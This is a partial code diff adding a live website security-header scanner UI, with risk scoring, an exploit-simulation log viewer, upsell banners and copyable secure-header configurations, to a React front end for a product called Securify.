                     {isLabOpen && (
@@ -1928,6 +2187,60 @@ audit performed client-side using Securify Interactive Portal.
                   </>
                 )}
               </div>
+            ) : (
+              // Website Scanner Tab
+              <div className="flex flex-col gap-6 animate-in fade-in duration-200">
+                <div className="flex flex-col md:flex-row items-center justify-between gap-6">
+                  <div className="space-y-1 text-left">
+                    <span className="inline-block bg-white/5 border border-white/10 rounded-full px-3 py-0.5 text-[9px] font-mono text-neutral-300 lowercase">
+                      production domain auditor
+                    </span>
+                    <h3 className="text-base font-medium text-white lowercase">
+                      {siteScanResults 
+                        ? `audit report: ${siteScanResults.domain}` 
+                        : "run real-time security scan on live website"}
+                    </h3>
+                    <p className="text-neutral-400 text-xs font-light lowercase leading-relaxed max-w-xl">
+                      {siteScanResults
+                        ? `completed compliance headers scanning. rating calculated based on risk weights.`
+                        : "enter your business domain name. securify will inspect security headers, SSL status, and calculate regulatory compliance & data breach financial risks."}
+                    </p>
+                  </div>
+
+                  <div className="w-full md:w-auto shrink-0 flex flex-col sm:flex-row gap-3">
+                    <form onSubmit={handleWebsiteScan} className="flex gap-2 w-full max-w-md">
+                      <input
+                        type="text"
+                        required
+                        disabled={siteScanning}
+                        value={siteUrl}
+                        onChange={(e) => setSiteUrl(e.target.value)}
+                        placeholder="e.g. example.com"
+                        className="bg-neutral-950 border border-white/10 text-white text-xs font-mono rounded-xl px-4 py-3 focus:outline-none focus:border-white/20 placeholder-neutral-700 w-full md:w-64 lowercase"
+                      />
+                      <button
+                        type="submit"
+                        disabled={siteScanning || !siteUrl.trim()}
+                        className="bg-white hover:bg-neutral-200 text-black text-xs font-mono font-medium rounded-xl px-6 py-3 lowercase transition-all select-none disabled:opacity-50 shrink-0"
+                      >
+                        {siteScanning ? "scanning..." : (siteScanResults ? "re-scan site" : "scan site")}
+                      </button>
+                    </form>
+                  </div>
+                </div>
+
+                {siteScanError && (
+                  <div className="mt-4 bg-red-950/20 border border-red-500/20 text-red-400 text-xs font-mono rounded-xl p-4 text-left flex items-start gap-2.5 animate-in fade-in slide-in-from-top-2 duration-200">
+                    <svg className="w-4.5 h-4.5 text-red-400 mt-0.5 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                    </svg>
+                    <div className="space-y-1">
+                      <span className="font-semibold block font-mono">scan failed</span>
+                      <p className="font-light text-[11px] text-red-400/80 leading-relaxed lowercase">{siteScanError}</p>
+                    </div>
+                  </div>
+                )}
+              </div>
             )}
           </div>
         </div>
@@ -1951,10 +2264,727 @@ audit performed client-side using Securify Interactive Portal.
           </div>
         )}
 
+        {/* Live Site Scanning Loader Progress Bar */}
+        {siteScanning && siteScanProgress && (
+          <div className="bg-neutral-900/50 border border-white/5 rounded-2xl p-6 mb-8 space-y-3 animate-pulse print:hidden">
+            <div className="flex justify-between items-center text-xs font-mono text-neutral-400">
+              <span className="lowercase font-mono text-neutral-500">running live audit: {siteScanProgress.current} / {siteScanProgress.total}</span>
+              <span className="text-white lowercase font-mono">{Math.round((siteScanProgress.current / siteScanProgress.total) * 100)}%</span>
+            </div>
+            <div className="w-full bg-neutral-950 h-1.5 rounded-full overflow-hidden">
+              <div 
+                className="bg-white h-full transition-all duration-300" 
+                style={{ width: `${(siteScanProgress.current / siteScanProgress.total) * 100}%` }}
+              />
+            </div>
+            <div className="text-[10px] font-mono text-neutral-500 truncate lowercase text-left">
+              status: {siteScanProgress.message}
+            </div>
+          </div>
+        )}
+
+        {/* Live Website Scan Results Display */}
+        {scanTab === 'website' && siteScanResults && (
+          <div className="space-y-6 animate-page-entrance text-left mb-8">
+            <div className="bg-neutral-900/40 border border-white/5 backdrop-blur-sm rounded-3xl p-6 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+              <div className="space-y-1">
+                <span className="text-[10px] font-mono text-neutral-500 uppercase">live audit monitor</span>
+                <h3 className="text-base font-semibold text-white lowercase">
+                  target website: {siteScanResults.domain}
+                </h3>
+              </div>
+              
+              {/* Toolbar Actions */}
+              <div className="flex flex-wrap gap-2">
+                <button
+                  onClick={handleExportSiteReportMarkdown}
+                  className="bg-emerald-950/60 hover:bg-emerald-900/60 text-emerald-400 border border-emerald-500/20 text-[10px] font-mono rounded-xl px-3 py-2 lowercase transition-all select-none"
+                >
+                  export (.md)
+                </button>
+                <button
+                  onClick={handleExportSiteReportJSON}
+                  className="bg-sky-950/60 hover:bg-sky-900/60 text-sky-400 border border-sky-500/20 text-[10px] font-mono rounded-xl px-3 py-2 lowercase transition-all select-none"
+                >
+                  export (.json)
+                </button>
+                <button
+                  onClick={handleShareSiteReport}
+                  className="bg-indigo-950/60 hover:bg-indigo-900/60 text-indigo-400 border border-indigo-500/20 text-[10px] font-mono rounded-xl px-3 py-2 lowercase transition-all select-none"
+                >
+                  {siteReportShared ? 'copied!' : 'share'}
+                </button>
+                <button
+                  onClick={() => {
+                    setSiteScanResults(null);
+                    setSiteUrl('');
+                    setActiveSiteExploitSim(null);
+                  }}
+                  className="bg-neutral-950 hover:bg-neutral-900 text-neutral-400 border border-white/5 hover:border-white/10 text-[10px] font-mono rounded-xl px-3 py-2 lowercase transition-all select-none"
+                >
+                  clear
+                </button>
+              </div>
+            </div>
+
+            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 items-stretch">
+              
+              {/* Circular Security Rating and Score Gauge */}
+              <div className="bg-neutral-900/40 border border-white/5 backdrop-blur-sm rounded-3xl p-6 flex flex-col items-center justify-center text-center">
+                <span className="text-[10px] font-mono text-neutral-500 mb-4 lowercase">site security rating</span>
+                
+                <div className="relative flex items-center justify-center">
+                  <svg className="w-32 h-32 transform -rotate-90">
+                    <circle
+                      cx="64"
+                      cy="64"
+                      r="54"
+                      stroke="rgba(255,255,255,0.03)"
+                      strokeWidth="8"
+                      fill="transparent"
+                    />
+                    <circle
+                      cx="64"
+                      cy="64"
+                      r="54"
+                      stroke={
+                        siteScanResults.grade === 'A+' 
+                          ? '#10b981' 
+                          : siteScanResults.grade === 'A' 
+                            ? '#34d399'
+                            : siteScanResults.grade === 'B' 
+                              ? '#f59e0b' 
+                              : siteScanResults.grade === 'C' 
+                                ? '#f97316' 
+                                : '#ef4444'
+                      }
+                      strokeWidth="8"
+                      fill="transparent"
+                      strokeDasharray="339.29"
+                      strokeDashoffset={339.29 - (339.29 * siteScanResults.score) / 100}
+                      className="transition-all duration-1000 ease-out"
+                    />
+                  </svg>
+                  <div className="absolute flex flex-col items-center justify-center">
+                    <span className={`text-4xl font-extrabold font-mono ${
+                      siteScanResults.grade === 'A+' || siteScanResults.grade === 'A'
+                        ? 'text-emerald-400' 
+                        : siteScanResults.grade === 'B' 
+                          ? 'text-amber-400' 
+                          : siteScanResults.grade === 'C' 
+                            ? 'text-orange-400' 
+                            : 'text-red-500'
+                    }`}>
+                      {siteScanResults.grade}
+                    </span>
+                  </div>
+                </div>
+
+                <div className="mt-4 space-y-1 font-mono">
+                  <span className="block text-xs font-medium text-white lowercase">
+                    compliance score: {siteScanResults.score} / 100
+                  </span>
+                  <span className="block text-[10px] text-neutral-400 lowercase">
+                    audited: {siteScanResults.domain}
+                  </span>
+                  <span className="block text-[10px] text-neutral-500 lowercase">
+                    {siteScanResults.sslActive ? "✓ SSL certificate active" : "⚠️ connection insecure (no HTTPS)"}
+                  </span>
+                </div>
+              </div>
+
+              {/* Financial Risk & Compliance Fines Card — IBM 2024 Model */}
+              <div className="bg-neutral-900/40 border border-white/5 backdrop-blur-sm rounded-3xl p-6 lg:col-span-2 flex flex-col justify-between">
+                <div>
+                  <div className="flex justify-between items-center mb-5">
+                    <div className="space-y-0.5">
+                      <span className="text-[10px] font-mono text-neutral-500 lowercase block">financial risk exposure model</span>
+                      <span className="text-[9px] text-neutral-600 font-light lowercase">source: IBM cost of a data breach 2024 · GDPR art. 83 · KVKK art. 18</span>
+                    </div>
+                    <span className={`text-[9px] px-2 py-0.5 rounded uppercase font-mono border ${
+                      siteScanResults.financialRisk?.riskLevel === 'CRITICAL'
+                        ? 'bg-red-950/40 border-red-500/20 text-red-400'
+                        : siteScanResults.financialRisk?.riskLevel === 'HIGH'
+                        ? 'bg-orange-950/40 border-orange-500/20 text-orange-400'
+                        : 'bg-amber-950/40 border-amber-500/20 text-amber-400'
+                    }`}>
+                      {siteScanResults.financialRisk?.riskLevel || 'HIGH'} risk
+                    </span>
+                  </div>
+
+                  {/* Attack Vector Summary */}
+                  {siteScanResults.financialRisk?.failedCritical > 0 && (
+                    <div className="mb-4 bg-red-950/20 border border-red-500/15 rounded-2xl p-3 text-left">
+                      <div className="flex items-start gap-2">
+                        <svg className="w-3.5 h-3.5 text-red-400 mt-0.5 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                        </svg>
+                        <p className="text-red-400 text-[10px] font-mono lowercase leading-relaxed">
+                          {siteScanResults.financialRisk.failedCritical} critical-severity vulnerability detected.
+                          {siteScanResults.financialRisk.failedHigh > 0 && ` ${siteScanResults.financialRisk.failedHigh} high-severity vulnerabilities detected.`}
+                          {' '}regulatory notification timelines under GDPR Art. 33 require breach disclosure within 72 hours of detection.
+                        </p>
+                      </div>
+                    </div>
+                  )}
+                  
+                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
+                    <div className="bg-black/40 border border-white/5 p-4 rounded-2xl text-left space-y-2">
+                      <div className="flex items-center gap-1.5">
+                        <svg className="w-3 h-3 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 14l6-6m-5.5.5h.01m4.99 5h.01M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16l3.5-2 3.5 2 3.5-2 3.5 2z" />
+                        </svg>
+                        <span className="text-[9px] font-mono text-neutral-500 lowercase">regulatory fines (GDPR/KVKK)</span>
+                      </div>
+                      <span className="block text-[11px] font-mono font-semibold text-red-400 leading-snug">
+                        {siteScanResults.financialRisk.potentialFine}
+                      </span>
+                      <span className="block text-[8px] text-neutral-600 lowercase font-light leading-relaxed">art. 32 mandates appropriate technical measures. missing security headers constitute a documented infringement.</span>
+                    </div>
+                    
+                    <div className="bg-black/40 border border-white/5 p-4 rounded-2xl text-left space-y-2">
+                      <div className="flex items-center gap-1.5">
+                        <svg className="w-3 h-3 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6" />
+                        </svg>
+                        <span className="text-[9px] font-mono text-neutral-500 lowercase">estimated breach cost (IBM 2024)</span>
+                      </div>
+                      <span className="block text-[11px] font-mono font-semibold text-red-400 leading-snug">
+                        {siteScanResults.financialRisk.dataBreachRisk}
+                      </span>
+                      <span className="block text-[8px] text-neutral-600 lowercase font-light leading-relaxed">includes: forensics, incident response, legal fees, customer notification, regulatory liaison, PR, and churn.</span>
+                    </div>
+                    
+                    <div className="bg-black/40 border border-white/5 p-4 rounded-2xl text-left space-y-2">
+                      <div className="flex items-center gap-1.5">
+                        <svg className="w-3 h-3 text-amber-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                        </svg>
+                        <span className="text-[9px] font-mono text-neutral-500 lowercase">cyber insurance surcharge</span>
+                      </div>
+                      <span className="block text-[11px] font-mono font-semibold text-amber-500 leading-snug">
+                        {siteScanResults.financialRisk.cyberInsurancePenalty}
+                      </span>
+                      <span className="block text-[8px] text-neutral-600 lowercase font-light leading-relaxed">underwriters assess missing mandatory controls as elevated actuarial risk profile. may trigger coverage exclusions.</span>
+                    </div>
+                  </div>
+                </div>
+
+                <div className="border-t border-white/5 pt-4 mt-5 flex flex-col sm:flex-row items-center justify-between gap-4">
+                  <div className="text-left">
+                    <span className="block text-[10px] text-neutral-400 font-mono lowercase">
+                      securify automated monitoring scans your domain daily and alerts you before regulators do.
+                    </span>
+                    <span className="block text-[9px] text-neutral-600 font-light lowercase mt-0.5">
+                      {siteScanResults.failedChecks || 0} active attack vectors · {siteScanResults.totalChecks || 7} checks completed · gdpr 72h notification window
+                    </span>
+                  </div>
+                  
+                  {premiumStatus?.valid ? (
+                    <span className="text-[10px] font-mono text-emerald-400 flex items-center gap-1.5 shrink-0">
+                      <span className="w-1.5 h-1.5 bg-emerald-400 rounded-full animate-ping" />
+                      active monitoring enabled
+                    </span>
+                  ) : (
+                    <button
+                      onClick={() => onPurchaseTrigger?.('pro', 'Pro', 'monthly')}
+                      className="bg-white hover:bg-neutral-200 text-black text-[10px] font-mono font-semibold px-5 py-2.5 rounded-xl lowercase transition-all select-none shrink-0"
+                    >
+                      enable automated daily checks
+                    </button>
+                  )}
+                </div>
+              </div>
+
+            </div>
+
+            {/* Exploit simulation output area (renders if running) */}
+            {activeSiteExploitSim && (
+              <div className="bg-neutral-950 border border-red-500/20 rounded-3xl p-6 space-y-4 font-mono text-xs animate-in slide-in-from-top-4 duration-300">
+                <div className="flex justify-between items-center border-b border-white/5 pb-3">
+                  <div className="flex items-center gap-2">
+                    <span className="w-2 h-2 bg-red-500 rounded-full animate-ping" />
+                    <span className="text-white lowercase font-mono">active exploit simulation: {activeSiteExploitSim.name}</span>
+                  </div>
+                  <button
+                    onClick={() => setActiveSiteExploitSim(null)}
+                    className="text-neutral-500 hover:text-white lowercase text-[10px] font-mono"
+                  >
+                    close terminal
+                  </button>
+                </div>
+                
+                <div className="bg-black border border-white/5 rounded-2xl p-4 min-h-[160px] max-h-[300px] overflow-y-auto custom-scrollbar space-y-1.5 text-left text-neutral-400 font-mono text-[11px] leading-relaxed">
+                  {activeSiteExploitSim.logs.map((log, lIdx) => (
+                    <div 
+                      key={lIdx} 
+                      className={
+                        log.startsWith('[!]') 
+                          ? 'text-red-400 font-semibold font-mono' 
+                          : log.startsWith('[+]') 
+                            ? 'text-emerald-400 font-mono' 
+                            : log.startsWith('$') 
+                              ? 'text-white font-mono' 
+                              : 'text-neutral-500 font-mono'
+                      }
+                    >
+                      {log}
+                    </div>
+                  ))}
+                  {activeSiteExploitSim.logs.length < 8 && (
+                    <div className="text-neutral-600 animate-pulse font-mono">_ executing simulation payload...</div>
+                  )}
+                </div>
+              </div>
+            )}
+
+            {/* Post-Scan Conversion CTA Banner */}
+            {!premiumStatus?.valid && (
+              <div className="bg-gradient-to-r from-neutral-900/80 via-indigo-950/30 to-neutral-900/80 border border-indigo-500/20 backdrop-blur-sm rounded-3xl p-6 flex flex-col md:flex-row items-start md:items-center justify-between gap-6">
+                <div className="flex items-start gap-4">
+                  <div className="w-10 h-10 bg-indigo-950/60 border border-indigo-500/30 rounded-2xl flex items-center justify-center shrink-0">
+                    <svg className="w-5 h-5 text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                    </svg>
+                  </div>
+                  <div className="space-y-1 text-left">
+                    <div className="flex items-center gap-2 flex-wrap">
+                      <span className="text-white text-sm font-medium lowercase">
+                        {(siteScanResults.failedChecks || 0) > 4
+                          ? `${siteScanResults.failedChecks} critical attack vectors found on ${siteScanResults.domain}`
+                          : `security audit complete — ${siteScanResults.failedChecks || 0} issues need remediation`
+                        }
+                      </span>
+                      <span className="text-[9px] font-mono bg-indigo-950/60 border border-indigo-500/20 text-indigo-400 px-2 py-0.5 rounded uppercase">
+                        upgrade to fix
+                      </span>
+                    </div>
+                    <p className="text-neutral-400 text-xs font-light lowercase leading-relaxed max-w-xl">
+                      securify pro continuously monitors {siteScanResults.domain} with daily automated scans, instant breach alerts (72h GDPR window compliance), signed PDF audit reports, and white-label reports for client delivery. includes infrastructure change detection and regression testing.
+                    </p>
+                    <div className="flex flex-wrap gap-3 mt-2">
+                      {['daily automated scans', 'gdpr 72h alert window', 'signed pdf reports', 'white-label delivery', 'api access'].map(feature => (
+                        <span key={feature} className="text-[9px] font-mono text-emerald-400 flex items-center gap-1">
+                          <svg className="w-2.5 h-2.5" fill="currentColor" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+                          {feature}
+                        </span>
+                      ))}
+                    </div>
+                  </div>
+                </div>
+                <button
+                  onClick={() => onPurchaseTrigger?.('pro', 'Pro', 'monthly')}
+                  className="bg-white hover:bg-neutral-100 text-black text-xs font-mono font-semibold px-6 py-3.5 rounded-xl lowercase transition-all select-none shrink-0 whitespace-nowrap"
+                >
+                  start pro plan — $19/mo
+                </button>
+              </div>
+            )}
+
+            {/* Checked Protocols Detailed Table */}
+            <div className="bg-neutral-900/40 border border-white/5 backdrop-blur-sm rounded-3xl p-6">
+              <div className="flex items-center justify-between mb-6">
+                <span className="text-[10px] font-mono text-neutral-500 lowercase">security compliance checks ({siteScanResults.passedChecks || 0}/{siteScanResults.totalChecks || 7} passed)</span>
+                <div className="flex gap-1.5">
+                  {['critical', 'high', 'medium'].map(sev => {
+                    const count = Object.values(siteScanResults.checks).filter((c: any) => !c.pass && c.severity === sev).length;
+                    if (count === 0) return null;
+                    return (
+                      <span key={sev} className={`text-[9px] font-mono px-2 py-0.5 rounded border ${
+                        sev === 'critical' ? 'bg-red-950/40 border-red-500/20 text-red-400'
+                        : sev === 'high' ? 'bg-orange-950/40 border-orange-500/20 text-orange-400'
+                        : 'bg-amber-950/40 border-amber-500/20 text-amber-400'
+                      }`}>{count} {sev}</span>
+                    );
+                  })}
+                </div>
+              </div>
+              
+              <div className="space-y-4">
+                {Object.entries(siteScanResults.checks).map(([key, check]: any) => (
+                  <div key={key} className="bg-neutral-900/20 border border-white/5 hover:border-white/10 rounded-3xl p-6 transition-all flex flex-col md:flex-row md:items-start justify-between gap-6">
+                    <div className="space-y-3.5 flex-1">
+                      <div className="flex items-center gap-2 flex-wrap select-none">
+                        <span className={`w-2 h-2 rounded-full shrink-0 ${
+                          check.pass ? 'bg-emerald-500' 
+                          : check.severity === 'critical' ? 'bg-red-500 animate-pulse'
+                          : check.severity === 'high' ? 'bg-orange-500'
+                          : 'bg-amber-500'
+                        }`} />
+                        <span className="text-xs font-semibold text-white lowercase">{check.name}</span>
+                        
+                        <span className={`text-[9px] font-mono px-2 py-0.5 rounded lowercase ${
+                          check.pass 
+                            ? 'bg-emerald-950/40 border border-emerald-500/20 text-emerald-400' 
+                            : 'bg-red-950/40 border border-red-500/20 text-red-400'
+                        }`}>
+                          {check.pass ? 'secure' : 'action required'}
+                        </span>
+                        
+                        {!check.pass && (
+                          <span className={`text-[9px] font-mono border px-2 py-0.5 rounded lowercase ${
+                            check.severity === 'critical'
+                              ? 'bg-red-950/40 border-red-500/30 text-red-400'
+                              : check.severity === 'high'
+                                ? 'bg-orange-950/40 border-orange-500/30 text-orange-400'
+                                : 'bg-amber-950/40 border-amber-500/30 text-amber-400'
+                          }`}>
+                            {check.severity}
+                          </span>
+                        )}
+                        
+                        {check.cwe && (
+                          <span className="text-[9px] font-mono bg-neutral-900 border border-white/10 text-neutral-400 px-2 py-0.5 rounded lowercase">
+                            {check.cwe}
+                          </span>
+                        )}
+                        
+                        {check.compliance && (
+                          <span className="text-[9px] font-mono bg-indigo-950/20 border border-indigo-500/10 text-indigo-400 px-2 py-0.5 rounded lowercase">
+                            {check.compliance}
+                          </span>
+                        )}
+                      </div>
+
+                      {/* Engine detail line */}
+                      {check.detail && (
+                        <p className="text-[10px] font-mono leading-relaxed text-neutral-400">
+                          → {check.detail}
+                        </p>
+                      )}
+                      
+                      {/* Structured threat analysis grid */}
+                      <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-6 border-t border-white/5 pt-4">
+                        <div className="space-y-4 text-left">
+                          <div>
+                            <span className="text-[9px] font-mono text-neutral-500 uppercase tracking-wider block mb-1">technical threat impact</span>
+                            <p className="text-neutral-400 text-xs font-light leading-relaxed lowercase">{check.impact}</p>
+                          </div>
+                          
+                          {check.businessImpact && (
+                            <div>
+                              <span className="text-[9px] font-mono text-rose-500/50 uppercase tracking-wider block mb-1">business & conversion risk</span>
+                              <p className="text-neutral-300 text-xs font-light leading-relaxed lowercase">{check.businessImpact}</p>
+                            </div>
+                          )}
+                        </div>
+
+                        <div className="space-y-4 flex flex-col justify-between">
+                          {!check.pass && check.recommendation && (
+                            <div>
+                              <span className="text-[9px] font-mono text-emerald-500/50 uppercase tracking-wider block mb-1 font-semibold">remediation strategy</span>
+                              <p className="text-neutral-300 text-xs font-light leading-relaxed lowercase">{check.recommendation}</p>
+                            </div>
+                          )}
+
+                          <div className="font-mono text-[9px] bg-black/60 border border-white/5 rounded-2xl p-3 flex justify-between items-center gap-3">
+                            <div className="truncate">
+                              <span className="text-neutral-500 select-none">observed value:</span>{" "}
+                              <span className="select-all text-neutral-300 truncate">{check.value}</span>
+                            </div>
+                          </div>
+
+                          {!check.pass && (
+                            <div className="bg-indigo-950/20 border border-indigo-500/10 rounded-2xl p-4 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
+                              <div className="space-y-0.5 text-left">
+                                <div className="flex items-center gap-1.5">
+                                  <span className="w-1.5 h-1.5 bg-indigo-400 rounded-full animate-ping" />
+                                  <span className="text-[9px] font-mono text-indigo-300 uppercase block font-bold tracking-wider">pro automatic patch</span>
+                                </div>
+                                <p className="text-neutral-400 text-[9px] font-light lowercase leading-snug">inject secure header rewrite rules instantly at the edge.</p>
+                              </div>
+                              {premiumStatus?.valid ? (
+                                <span className="text-[9px] font-mono text-emerald-400 shrink-0">✓ active</span>
+                              ) : (
+                                <button
+                                  onClick={() => onPurchaseTrigger?.('pro', 'Pro', 'monthly')}
+                                  className="bg-white hover:bg-neutral-200 text-black text-[9px] font-mono font-bold px-3 py-1.5 rounded-xl transition-all lowercase select-none shrink-0"
+                                >
+                                  deploy patch
+                                </button>
+                              )}
+                            </div>
+                          )}
+                        </div>
+                      </div>
+                    </div>
+
+                    <div className="shrink-0 flex md:flex-col gap-2">
+                      {!check.pass && (
+                        <button
+                          onClick={() => handleStartSiteExploitSimulation(key, check.name)}
+                          className="bg-red-950/20 hover:bg-red-900/40 text-red-400/90 border border-red-500/10 text-[10px] font-mono px-4 py-2.5 rounded-xl lowercase transition-all select-none whitespace-nowrap"
+                        >
+                          simulate exploit
+                        </button>
+                      )}
+                    </div>
+                  </div>
+                ))}
+              </div>
+            </div>
+
+            {/* Safe configuration solutions */}
+            <div className="bg-neutral-900/40 border border-white/5 backdrop-blur-sm rounded-3xl p-6 space-y-6">
+              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-white/5 pb-4">
+                <div className="space-y-1">
+                  <h4 className="text-sm font-semibold text-white lowercase">safe configuration solutions</h4>
+                  <p className="text-[10px] text-neutral-500 lowercase">copy-paste config rules to secure your headers and stack details instantly.</p>
+                </div>
+                
+                {/* Solution Tab Selectors */}
+                <div className="inline-flex bg-black border border-white/5 rounded-xl p-1 select-none shrink-0 font-mono text-[10px]">
+                  {(['nginx', 'nextjs', 'express', 'apache'] as const).map(tab => (
+                    <button
+                      key={tab}
+                      onClick={() => setSolutionConfigTab(tab)}
+                      className={`px-3 py-1.5 rounded-lg transition-all lowercase ${
+                        solutionConfigTab === tab
+                          ? 'bg-neutral-900 text-white border border-white/10'
+                          : 'text-neutral-500 hover:text-white'
+                      }`}
+                    >
+                      {tab}
+                    </button>
+                  ))}
+                </div>
+              </div>
+
+              {/* Solutions Code blocks */}
+              <div className="relative bg-black border border-white/5 rounded-2xl p-4 font-mono text-[11px] text-neutral-300 leading-relaxed overflow-x-auto text-left">
+                {solutionConfigTab === 'nginx' ? (
+                  <pre>{`# Add headers in server or location block inside nginx.conf:
+
+add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none';" always;
+add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
+add_header X-Frame-Options "DENY" always;
+add_header X-Content-Type-Options "nosniff" always;
+add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+
+# Disable Server Signature Leak:
+server_tokens off;`}</pre>
+                ) : solutionConfigTab === 'nextjs' ? (
+                  <pre>{`// Add inside next.config.js:
+
+module.exports = {
+  async headers() {
+    return [
+      {
+        source: '/(.*)',
+        headers: [
+          { key: 'Content-Security-Policy', value: "default-src 'self'; script-src 'self';" },
+          { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains; preload' },
+          { key: 'X-Frame-Options', value: 'DENY' },
+          { key: 'X-Content-Type-Options', value: 'nosniff' },
+          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' }
+        ]
+      }
+    ];
+  }
+};`}</pre>
+                ) : solutionConfigTab === 'express' ? (
+                  <pre>{`// Use helmet middleware for Express backends:
+const express = require('express');
+const helmet = require('helmet');
+const app = express();
+
+app.use(helmet());`}</pre>
+                ) : (
+                  <pre>{`# Add rules inside your .htaccess or httpd.conf:
+
+<IfModule mod_headers.c>
+  Header set Content-Security-Policy "default-src 'self'; script-src 'self';"
+  Header set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
+  Header set X-Frame-Options "DENY"
+  Header set X-Content-Type-Options "nosniff"
+  Header set Referrer-Policy "strict-origin-when-cross-origin"
+</IfModule>
+
+# Disable Server signature details:
+ServerSignature Off
+ServerTokens Prod`}</pre>
+                )}
+                
+                <button
+                  onClick={async () => {
+                    let code = "";
+                    if (solutionConfigTab === 'nginx') {
+                      code = `add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none';" always;\nadd_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;\nadd_header X-Frame-Options "DENY" always;\nadd_header X-Content-Type-Options "nosniff" always;\nadd_header Referrer-Policy "strict-origin-when-cross-origin" always;\nserver_tokens off;`;
+                    } else if (solutionConfigTab === 'nextjs') {
+                      code = `module.exports = {\n  async headers() {\n    return [\n      {\n        source: '/(.*)',\n        headers: [\n          { key: 'Content-Security-Policy', value: "default-src 'self'; script-src 'self';" },\n          { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains; preload' },\n          { key: 'X-Frame-Options', value: 'DENY' },\n          { key: 'X-Content-Type-Options', value: 'nosniff' },\n          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' }\n        ]\n      }\n    ];\n  }\n};`;
+                    } else if (solutionConfigTab === 'express') {
+                      code = `const express = require('express');\nconst helmet = require('helmet');\nconst app = express();\n\napp.use(helmet());`;
+                    } else {
+                      code = `<IfModule mod_headers.c>\n  Header set Content-Security-Policy "default-src 'self'; script-src 'self';"\n  Header set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"\n  Header set X-Frame-Options "DENY"\n  Header set X-Content-Type-Options "nosniff"\n  Header set Referrer-Policy "strict-origin-when-cross-origin"\n</IfModule>\nServerSignature Off\nServerTokens Prod`;
+                    }
+                    await navigator.clipboard.writeText(code);
+                  }}
+                  className="absolute right-3 top-3 bg-neutral-900 border border-white/10 hover:border-white/20 text-neutral-400 hover:text-white px-2 py-1 rounded text-[9px] transition-colors"
+                >
+                  copy config
+                </button>
+              </div>
+            </div>
+
+            {/* Gated Premium Features */}
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+              
+              {/* PDF report */}
+              <div className="bg-neutral-900/40 border border-white/5 backdrop-blur-sm rounded-3xl p-6 flex flex-col justify-between items-start space-y-4">
+                <div className="space-y-1.5 text-left">
+                  <span className="inline-flex items-center gap-1.5 text-[9px] font-mono text-neutral-500 uppercase">
+                    executive reporting
+                  </span>
+                  <h4 className="text-sm font-semibold text-white lowercase">download signed PDF report</h4>
+                  <p className="text-neutral-400 text-xs font-light lowercase leading-relaxed">
+                    export a detailed, multi-page security audit PDF showing compliance parameters, exploit timelines, and remediations. deliver to clients as agency white-label reports.
+                  </p>
+                </div>
+                
+                {premiumStatus?.valid && (premiumStatus.plan === 'Pro' || premiumStatus.plan === 'Agency') ? (
+                  <button
+                    onClick={handleExportSiteReportMarkdown}
+                    className="bg-white hover:bg-neutral-200 text-black text-xs font-mono font-medium rounded-xl px-5 py-3.5 lowercase transition-all select-none"
+                  >
+                    download PDF document
+                  </button>
+                ) : (
+                  <div className="space-y-3 w-full">
+                    <div className="flex items-center gap-2 text-[10px] text-amber-500 font-mono">
+                      <svg className="w-4 h-4 text-amber-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                      </svg>
